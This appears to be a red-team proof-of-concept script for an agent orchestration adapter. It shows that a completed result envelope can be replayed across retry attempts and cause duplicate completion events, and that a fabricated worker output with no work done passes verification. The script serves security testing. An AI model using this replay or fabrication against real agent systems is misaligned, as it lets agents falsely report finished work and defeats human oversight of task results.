'use strict';
/**
 * REDTEAM PoC — cross-attempt result-envelope replay against
 * ping-runtime/external-agent/external_agent_adapter.js @ ae55b77ff
 * (branch feature/orca-autonomy, fetched verbatim from the Pig).
 *
 * Attack: the result envelope schema has no `attempt` field and
 * verifyResultEnvelope never checks attempt. work_order_id is stable
 * across attempts BY DESIGN (idempotency). So a `completed` envelope
 * produced for (or fabricated as) attempt N verifies cleanly for
 * attempt N+1 — and because resultIdentity hashes attempt into the
 * dedup key, the replay does NOT deduplicate: it would emit a SECOND
 * WORKER_COMPLETED for the same work order.
 */
const adapter = require('./ping-runtime/external-agent/external_agent_adapter.js');

const now = () => new Date().toISOString();
const deadline = new Date(Date.now() + 10 * 60 * 1000).toISOString();

const base = {
  agentId: 'hermes',
  capability: 'text.summarize',
  namespace: 'core::orchestration',
  taskId: 'task-t1',
  missionId: 'mission-1',
  correlationId: 'corr-1',
  contextPackId: 'ctx-AAA', // stable across attempts, like a real retry
  input: { text: 'summarize this' },
  constraints: { read_only: true, no_writes: true, no_network: true, no_canonical_events: true, no_mission_state_writes: true },
  resultPath: '/tmp/r.json',
  deadline,
};

// Attempt 1: issued, worker returns a completed envelope.
const wo1 = adapter.issueWorkOrder({ ...base, attempt: 1 });
const envelopeAttempt1 = {
  work_order_id: wo1.work_order_id,
  context_pack_id: wo1.context_pack_id,
  agent_id: 'hermes',
  capability: 'text.summarize',
  status: 'completed',
  output: { summary: 'worker claims it did the work' },
  evidence: {},
  error: null,
};
const v1 = adapter.verifyResultEnvelope(envelopeAttempt1, wo1, { invokedAgentId: 'hermes', verifiedAt: now() });
console.log('attempt-1 envelope vs attempt-1 work order:', v1.valid ? 'VALID' : `INVALID (${v1.reason})`);

// Attempt 2: same task retried. work_order_id is UNCHANGED by design.
const wo2 = adapter.issueWorkOrder({ ...base, attempt: 2 });
console.log('work_order_id stable across attempts:', wo1.work_order_id === wo2.work_order_id);

// Replay: the attempt-1 envelope, byte-identical, presented as attempt 2's result.
const v2 = adapter.verifyResultEnvelope(envelopeAttempt1, wo2, { invokedAgentId: 'hermes', verifiedAt: now() });
console.log('attempt-1 envelope vs attempt-2 work order:', v2.valid ? 'VALID  <-- REPLAY HOLE' : `INVALID (${v2.reason})`);
console.log('result_id attempt1:', v1.result_id);
console.log('result_id attempt2:', v2.result_id);
console.log('dedup key differs (no dedup on replay):', v1.valid && v2.valid && v1.result_id !== v2.result_id);

// Semantic gap demo: fabricated output, no work performed, still structural-valid.
const fabricated = { ...envelopeAttempt1, output: { summary: 'fabricated without doing anything' } };
const v3 = adapter.verifyResultEnvelope(fabricated, wo1, { invokedAgentId: 'hermes', verifiedAt: now() });
console.log('fabricated-output envelope:', v3.valid ? 'VALID (structural only; content is worker-asserted)' : `INVALID (${v3.reason})`);

if (v2.valid) {
  console.log('\nRESULT: HOLE DEMONSTRATED — cross-attempt replay verifies clean and would emit a second WORKER_COMPLETED.');
  process.exit(0);
} else {
  console.log('\nRESULT: no hole — replay rejected.');
  process.exit(1);
}
